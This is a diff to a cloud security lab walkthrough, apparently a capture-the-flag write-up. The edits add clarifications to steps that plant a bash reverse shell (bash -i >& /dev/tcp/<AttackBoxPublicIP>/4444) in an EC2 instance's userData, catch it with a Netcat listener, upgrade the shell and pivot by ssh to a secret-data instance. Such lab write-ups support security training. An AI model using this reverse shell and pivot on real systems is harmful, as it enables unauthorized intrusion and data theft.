@@ -284,6 +284,8 @@ Let's try out the native Bash approach. Take care to use the AttackBox and use i
 bash -i >& /dev/tcp/<AttackBoxPublicIP>/4444 0>&1
 ```
 
+Remember to replace `<AttackBoxPublicIp>` with your machine's public IP address. Also note that this payload will target port 4444. If needed or desired, you can replace this with another port, but remember to use the same one for the listener.
+
 Save it as *reverse-shell-native.txt*. Next, base64-encode the file. Since OpenSSL is available on *many* platforms, we can use that to encode its contents:
 
 ```
@@ -300,7 +302,7 @@ Now, we need to upload the contents to one of the instances. From trial-and-erro
 
 Instead, we can defer to the attack workflow provided in the lab briefing: setting up the reverse shell to the *ApplicationInstance*, then using a password-based *ssh* to the *SecretDataInstance*. 
 
-First, revert the original *userData* on the secret instance. Then, stop the *ApplicationInstance*, update the *userData* attribute with the same ASCII-encoded reverse shell payload, and start the instance again, using the *ApplicationInstance* ID. 
+First, revert the original *userData* on the secret instance. Ensure that the AttackBox is running the Netcat listener. Then, stop the *ApplicationInstance*, update the *userData* attribute with the same ASCII-encoded reverse shell payload, and start the instance again, using the *ApplicationInstance* ID. 
 
 ```
 ~$ aws ec2 start-instances \
@@ -329,7 +331,9 @@ Note that stopping and starting can both take a few minutes, so grab a cup of co
     --instance-ids i-...
 ```
 
-In any case, once successful, the *nc* listener will receive the connection. At this point, I would strongly recommend running `bash -i` or run `python -c 'import pty; pty.spawn("/bin/bash")'`. If not, you won't see the SSH prompts, and this may interfere with the login process.
+In any case, once successful, the *nc* listener will receive the connection. You are now connected to the *ApplicationInstance* box. The next step is to use *ssh* to pivot into the *SecretDataInstance*.
+
+At this point, I would strongly recommend running `bash -i` or run `python -c 'import pty; pty.spawn("/bin/bash")'`. If not, you won't see the SSH prompts, and this may interfere with the login process.
 
 Once you're ready, use:
 
